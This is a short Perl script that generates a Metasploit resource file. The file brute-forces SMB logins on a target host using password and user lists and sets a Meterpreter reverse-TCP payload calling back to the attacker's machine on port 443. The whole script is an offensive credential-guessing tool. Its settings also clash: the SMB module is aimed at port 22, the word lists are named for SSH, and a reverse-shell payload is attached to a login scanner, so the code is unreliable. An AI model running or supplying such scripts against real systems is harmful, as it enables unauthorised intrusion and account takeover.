if (@ARGV < 2)
	{
	    print "Usage: ./smb_win_brute.pl source target > smb_win_brute.rc\n";
	    print "passwords in /root/ssh_pass\n";
	    print "users in /root/ssh_users\n";
	} else {
	$source=$ARGV[0];
	$source_port="443";
	$target=$ARGV[1];
	
print "use auxiliary/scanner/smb/smb_login"."\n";
print "set PAYLOAD windows/meterpreter/reverse_tcp"."\n";
print "set RHOSTS ".$target."\n";
print "set RPORT 22"."\n";
print "set BLANK_PASSWORDS true"."\n";
print "set STOP_ON_SUCCESS true"."\n";
print "set PASS_FILE /root/ssh_pass"."\n";
print "set USER_FILE /root/ssh_users"."\n";
print "set LHOST ".$source."\n";
print "set LPORT ".$source_port."\n";
print "run"."\n";	
	
	}

